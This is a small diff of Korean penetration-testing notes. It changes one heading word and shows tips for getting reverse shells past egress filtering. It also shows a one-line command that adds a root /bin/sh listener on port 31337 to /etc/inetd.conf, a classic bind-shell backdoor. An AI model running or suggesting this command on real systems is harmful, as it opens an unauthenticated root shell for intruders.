@@ -2,7 +2,7 @@
 - nc/bash/python3 등 리버스 연결이 되지 않는다면 elf 파일 혹은 exe 파일을 만들어서 전달해서 실행시켜보기.
 - 리스닝 포트를 well knwon 포트(80,443 등)로 바꿔서 받아보기.
 
-# inetd.conf(옛날 리눅스 버전)
+# inetd.conf(옛날 리눅스 환경)
 `
 echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
 `
